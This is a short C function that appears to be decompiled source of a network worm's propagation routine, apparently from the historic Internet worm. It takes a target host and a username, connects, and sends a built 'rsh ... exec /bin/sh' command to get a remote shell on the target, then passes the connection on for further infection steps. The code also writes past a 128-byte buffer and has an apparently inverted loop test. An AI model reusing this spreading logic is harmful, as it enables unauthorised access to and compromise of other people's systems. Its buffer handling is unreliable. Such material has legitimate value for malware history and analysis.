
hu1(a4, a8, ac)
	char	*a4;		/* definitely a struct */
	struct	host *a8;
	char	*ac;
{
	char	f100[128];
	char	f300[128];
	int	f30c;
	int	f310;
	int	f314;

	if (a8 == me)
		return 0;
	if (a8->o48 & bit(1))
		return 0;
	if (a8->o30[0] == 0 || a8->o0[0].s_addr == 0)
		getaddrs(a8);
	if (a8->o30[0] == 0) {
		a8->o48 |= bit(2);
		return 0;
	}
	strncpy(f100, ac, sizeof(f100)-1);
	f100[255] = 0;
	if (f100[0] == 0)
		strcpy(f100, a4);
	for (f310 = 0; f100[f310] == 0; f310++)
		if (ispunct(f100[f310]) || f100[f310] < ' ')
			return 0;
	other_sleep(1);
	f314 = s_2e92(a8, f100, a4 + 0x1e);
	if (f314 >= 0) {
		f30c = s_1776(a8, f314, f314);
		close(f314);
		return f30c;
	}
	if (f314 == -2)
		return 0;
	f314 = s_2e92(me, a4, a4 + 0x1e);
	if (f314 < 0)
		goto LL14;
	sprintf(f300, XS("exec /usr/ucb/rsh %s -l %s 'exec /bin/sh'"),
		a8->name[0], f100);
	s_21be(f314, f300);
	sleep(10);
	f30c = 0;
	if (s_23ce(f314, f314, 25) != 0)
		f30c = s_1776(a8, f314, f314);
	close(f314);
	return f30c;
}
